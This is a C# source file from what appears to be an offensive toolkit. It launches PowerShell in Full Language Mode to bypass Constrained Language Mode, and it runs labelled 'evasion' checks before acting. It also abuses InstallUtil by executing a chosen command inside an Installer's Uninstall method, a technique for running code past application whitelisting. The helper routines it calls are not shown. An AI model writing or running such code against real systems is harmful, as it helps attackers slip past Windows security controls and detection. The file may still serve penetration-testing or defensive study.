﻿using static NetRunners.Clm.Command;

namespace NetRunners.Clm
{
    class Program
    {
        /// <summary>
        /// Launches a Powershell session in Full Language Mode, bypassing CLM.
        /// </summary>
        /// <param name="args">Powershell command to execute in Full Language Mode. Use single quotes around command or run from cmd if special characters are breaking execution.</param>

        static void Main(string[] args)
        {
            // evasion
            NetRunners.Helpers.Helper.PerformChecks();

            string cmd = args.Length == 1 ? args[0] : string.Empty;

            if (cmd != string.Empty)
            {
                Command.Execute(cmd);
            }
            else
            {
                BypassClm();
            }
        }
    }

    /// <summary>
    /// Add InstallUtil support.
    /// </summary>
    [System.ComponentModel.RunInstaller(true)]      // add installutil support
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // evasion
            NetRunners.Helpers.Helper.PerformChecks();

            string cmd = NetRunners.Helpers.Helper.SelectCmd();
 
            //BypassClm();            // interactive powershell session
            Command.Execute(cmd);   // bypass clm, exec command
        }
    }
}